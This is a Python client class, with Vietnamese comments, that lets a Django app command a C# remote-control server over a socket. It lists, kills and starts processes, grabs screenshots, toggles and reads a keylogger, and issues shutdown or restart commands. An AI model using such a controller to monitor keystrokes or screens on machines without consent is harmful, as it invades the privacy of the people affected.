"""
Socket Client Helper - Giao tiếp với C# Server
Chuyển đổi từ Flask app.py sang Django
"""

# ==================== IMPORTS ====================

import base64
import socket


# ==================== MAIN CLASS ====================

class RemoteControlClient:
    """Client để giao tiếp với C# Remote Control Server"""

    # ==================== CLASS CONSTANTS ====================
    
    # Danh sách ánh xạ tên thông dụng sang tên tiến trình thực tế
    APP_ALIASES = {
        "edge": "msedge",
        "chrome": "chrome",
        "coc coc": "browser",
        "word": "winword",
        "excel": "excel",
        "powerpoint": "powerpnt",
        "notepad": "notepad",
        "calc": "calc",
        "paint": "mspaint",
        "cmd": "cmd"
    }

    # ==================== CONSTRUCTOR ====================
    
    def __init__(self, host: str = '127.0.0.1', port: int = 5656, timeout: int = 10):
        """Khởi tạo client với host, port và timeout."""
        self.host = host
        self.port = port
        self.timeout = timeout

    # ==================== UTILITY METHODS ====================
    
    def recvall(self, sock: socket.socket, n: int) -> bytes | None:
        """Nhận đủ n bytes dữ liệu từ socket (dùng cho ảnh)."""
        data = b''
        while len(data) < n:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    # ==================== CORE METHODS ====================
    
    def send_command_to_server(self, command_type: str, sub_command: str = None, args: str = None) -> dict:
        """
        Gửi lệnh Socket sang C# Server và xử lý phản hồi.
        
        Args:
            command_type: Loại lệnh (PROCESS, APPLICATION, KEYLOG, TAKEPIC, SHUTDOWN, RESTART)
            sub_command: Lệnh phụ (XEM, KILL, START, HOOK, UNHOOK, etc.)
            args: Tham số bổ sung (PID, tên process, etc.)
        
        Returns:
            dict với keys: status (success/error), data, message
        """
        response_data = None
        status = "error"
        msg = ""
        client = None

        try:
            # 1. Tạo kết nối Socket
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(self.timeout)
            client.connect((self.host, self.port))
            writer = client.makefile('w', encoding='utf-8', newline='\r\n')
            
            # 2. Gửi lệnh chính (PROCESS, KEYLOG, TAKEPIC...)
            writer.write(f"{command_type}\n")
            writer.flush()

            # 3. Xử lý từng loại lệnh cụ thể
            if command_type in ["PROCESS", "APPLICATION"]:
                reader = client.makefile('r', encoding='utf-8', newline='\r\n')
                
                if sub_command == "XEM":  # Lấy danh sách
                    writer.write("XEM\n")
                    writer.flush()
                    try:
                        line = reader.readline()
                        if line:
                            count = int(line.strip())
                            data_list = []
                            for _ in range(count):
                                p_name = reader.readline().strip()
                                p_id = reader.readline().strip()
                                p_threads = reader.readline().strip()
                                data_list.append({
                                    "name": p_name,
                                    "id": p_id,
                                    "threads": p_threads
                                })
                            response_data = data_list
                            status = "success"
                    except Exception as e:
                        msg = f"Read error: {str(e)}"

                elif sub_command in ["KILL", "START"]:  # Diệt hoặc Mở
                    writer.write(f"{sub_command}\n")
                    writer.write(f"{sub_command}ID\n")
                    
                    # Xử lý alias (ví dụ nhập 'word' -> gửi 'winword')
                    final_args = args
                    if sub_command == "START" and args:
                        lower_arg = args.lower()
                        if lower_arg in self.APP_ALIASES:
                            final_args = self.APP_ALIASES[lower_arg]
                    
                    writer.write(f"{final_args}\n")
                    writer.flush()
                    
                    # Đọc kết quả trả về từ C#
                    result = reader.readline()
                    if result:
                        result = result.strip()
                        if "Successfully" in result:
                            status = "success"
                        msg = result
                    else:
                        msg = "No response from server"
                
                writer.write("QUIT\n")
                writer.flush()

            elif command_type == "TAKEPIC":
                client.sendall(b"TAKE\n")
                # Đọc kích thước ảnh trước
                size_buffer = b""
                while True:
                    char = client.recv(1)
                    if char == b'\n' or not char:
                        break
                    size_buffer += char
                
                size_str = size_buffer.decode('utf-8').strip()
                if size_str.isdigit() and int(size_str) > 0:
                    # Đọc dữ liệu ảnh theo kích thước
                    img_data = self.recvall(client, int(size_str))
                    if img_data:
                        # Chuyển ảnh sang Base64 để hiển thị trên Web
                        response_data = base64.b64encode(img_data).decode('utf-8')
                        status = "success"
                client.sendall(b"QUIT\n")

            elif command_type == "KEYLOG":
                reader = client.makefile('r', encoding='utf-8', newline='\r\n')
                
                if sub_command == "PRINT":
                    writer.write("PRINT\n")
                    writer.flush()
                    response_data = reader.readline().strip()
                    status = "success"
                    
                elif sub_command in ["HOOK", "UNHOOK"]:
                    writer.write(f"{sub_command}\n")
                    writer.flush()
                    status = "success"
                    msg = "Keylogger Hooked (On)" if sub_command == "HOOK" else "Keylogger Unhooked (Off)"
                    
                elif sub_command == "CLEAR":
                    writer.write("CLEAR\n")
                    writer.flush()
                    status = "success"
                    msg = reader.readline().strip()
                    
                elif sub_command == "STATUS":
                    writer.write("STATUS\n")
                    writer.flush()
                    status_str = reader.readline().strip()
                    response_data = status_str
                    status = "success"

                writer.write("QUIT\n")
                writer.flush()

            elif command_type in ["SHUTDOWN", "RESTART"]:
                status = "success"
                msg = f"Sent {command_type} command."
                writer.write("QUIT\n")
                writer.flush()

        except Exception as e:
            msg = f"Server Error: {str(e)}"
        finally:
            if client:
                client.close()

        return {"status": status, "data": response_data, "message": msg}
